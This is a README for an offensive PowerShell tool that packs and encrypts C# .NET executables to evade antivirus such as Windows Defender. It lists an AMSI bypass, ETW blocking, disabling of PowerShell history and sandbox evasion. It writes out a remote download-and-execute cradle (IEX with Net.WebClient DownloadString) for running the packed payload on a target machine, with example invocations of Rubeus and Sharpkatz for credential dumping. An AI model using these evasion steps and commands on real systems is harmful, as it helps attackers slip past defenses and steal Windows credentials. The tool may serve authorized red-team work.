### Invoke-Csharp-Packer.ps1
--------------------------------------
'Invoke-Csharp-Packer' allows to pack and encrypt offensive (C#) .NET executable files in order to bypass AV solutions such as Windows Defender.
It generates an obfuscated and encrypted PowerShell script that contains the (C#) .NET executable file.

> FEATURES
  - AES encryption and GZip/Deflate compression (based on 'Xencrypt')
  - AMSI bypass
  - Blocking Event Tracing for Windows (ETW)
  - Disabling PowerShell history logging
  - Basic sandbox evasion techniques (optional)
    - stop/exit if the PowerShell session is being debugged (detection based on "Test-Path Variable:PSDebugContext")
    - wait for 60 seconds before execution
  
> USAGE
  - Step 1. Generate an obfuscated & encrypted PowerShell script that contains your (C#) .NET executable file (e.g. Rubeus.exe, Sharpkatz.exe) stored locally or on a remote web server.
```
PS C:\> Import-Module ./Invoke-Csharp-Packer.ps1
PS C:\> Invoke-Csharp-Packer -FilePath C:\path\Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1
--- or ---
PS C:\> Invoke-Csharp-Packer -FilePath C:\path\Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1 -Sandbox
``` 
```
PS C:\> Import-Module ./Invoke-Csharp-Packer.ps1
PS C:\> Invoke-Csharp-Packer -FileUrl https://URL/Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1 
--- or ---
PS C:\> Invoke-Csharp-Packer -FileUrl https://URL/Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1 -Sandbox
```
  - Step 2. Download & execute the obfuscated & encrypted PowerShell script (that contains your (C#) .NET executable file) on a target Windows computer
```
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://URL/Packed-Csharp-binary.ps1'); 
PS C:\> Invoke-Packed-NET-Executable "argument1","argument2","argument3",...
Example for Rubeus: Invoke-Packed-NET-Executable "logonsession","/current"

--- or ---

PS C:\> WGET -URI https://URL/Packed-Csharp-binary.ps1 -OutFile C:\temp\Packed-Csharp-binary.ps1
PS C:\> Import-Module C:\temp\Packed-Csharp-binary.ps1
PS C:\> Invoke-Packed-NET-Executable "argument1","argument2","argument3",...
Example for Sharpkatz: Invoke-Packed-NET-Executable "--Command","logonpasswords"</i>
``` 

> LICENSE
  - GNU General Public License v3.0
